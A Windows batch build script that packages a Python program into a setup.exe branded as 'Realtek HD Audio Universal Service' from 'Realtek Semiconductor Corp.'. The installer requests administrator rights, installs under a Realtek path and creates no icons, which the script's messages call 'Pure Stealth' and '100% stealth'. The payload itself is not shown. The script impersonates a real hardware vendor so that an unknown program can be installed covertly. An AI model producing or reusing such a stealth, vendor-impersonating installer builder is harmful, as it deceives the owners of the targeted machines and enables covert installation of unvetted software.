@echo off
title Make Standalone Setup.exe (Realtek HD Audio Universal Service)
cd /d "%~dp0"

echo =====================================================================
echo    CREATING STEALTH WINDOWS INSTALLER (SETUP.EXE)
echo    App Name: Realtek HD Audio Universal Service
echo    Publisher: Realtek Semiconductor Corp.
echo =====================================================================
echo.

:: 0. Sync latest Terms & Conditions from Central Dashboard if reachable
echo [*] Checking Central Dashboard for latest Terms ^& Conditions...
powershell -NoProfile -Command "try { $r = Invoke-WebRequest -Uri 'http://localhost:5000/api/terms-conditions?format=txt' -TimeoutSec 2 -UseBasicParsing; if ($r.StatusCode -eq 200 -and $r.Content.Trim().Length -gt 20) { Set-Content -Path 'TERMS_AND_CONDITIONS.txt' -Value $r.Content -Encoding UTF8; Write-Host '[OK] Synced latest Terms & Conditions.' } } catch { Write-Host '[INFO] Using bundled TERMS_AND_CONDITIONS.txt (server unreachable).' }"

:: 1. Build PyInstaller Standalone Binary
echo [*] STEP 1/2: Compiling Python binaries with PyInstaller...
call build_exe.bat
if %errorlevel% neq 0 (
    echo [ERROR] PyInstaller compilation failed.
    pause
    exit /b 1
)

:: 2. Check if Inno Setup compiler exists
echo.
echo [*] STEP 2/2: Checking for Inno Setup compiler (ISCC.exe)...

set "ISCC_PATH="
if exist "C:\Program Files (x86)\Inno Setup 6\ISCC.exe" set "ISCC_PATH=C:\Program Files (x86)\Inno Setup 6\ISCC.exe"
if exist "C:\Program Files\Inno Setup 6\ISCC.exe" set "ISCC_PATH=C:\Program Files\Inno Setup 6\ISCC.exe"
if exist "C:\Program Files (x86)\Inno Setup 7\ISCC.exe" set "ISCC_PATH=C:\Program Files (x86)\Inno Setup 7\ISCC.exe"
if exist "C:\Program Files\Inno Setup 7\ISCC.exe" set "ISCC_PATH=C:\Program Files\Inno Setup 7\ISCC.exe"

if defined ISCC_PATH (
    echo [*] Found Inno Setup Compiler at: "%ISCC_PATH%"
    echo [*] Compiling setup.iss into setup.exe...
    "%ISCC_PATH%" setup.iss
    if %errorlevel% equ 0 (
        echo.
        echo =====================================================================
        echo [SUCCESS] Windows Installer created successfully!
        echo Location: setup_output\setup.exe
        echo.
        echo Properties:
        echo   - File Name: setup.exe
        echo   - Installed Name: Realtek HD Audio Universal Service
        echo   - Target Path: C:\Program Files\Realtek\Audio\Service\
        echo   - Control Panel: Realtek Semiconductor Corp.
        echo   - Icons: 0 Desktop Icons, 0 Start Menu clutter (Pure Stealth)
        echo =====================================================================
        pause
        exit /b 0
    )
)

:: Fallback if Inno Setup is not installed on this PC
echo.
echo [*] Inno Setup compiler was not found. Packaging standalone setup.exe using PyInstaller payload installer...
if not exist "installer_builder\installer_core.py" (
    echo [ERROR] Installer core script missing.
    pause
    exit /b 1
)

".venv\Scripts\pyinstaller.exe" ^
    --noconfirm ^
    --onefile ^
    --uac-admin ^
    --name "setup" ^
    --icon "app_icon.ico" ^
    --add-data "dist\Realtek HD Audio Universal Service;payload" ^
    --add-data "TERMS_AND_CONDITIONS.txt;." ^
    --distpath "setup_output" ^
    installer_builder\installer_core.py

echo.
echo =====================================================================
echo [SUCCESS] Standalone setup.exe built successfully!
echo File: setup_output\setup.exe
echo.
echo Properties:
echo   - File Name: setup.exe
echo   - Installed Name in Control Panel: Realtek HD Audio Universal Service
echo   - Target Location: C:\Program Files\Realtek\Audio\Service\
echo   - No Desktop / Start Menu Icons (100%% stealth)
echo =====================================================================
pause

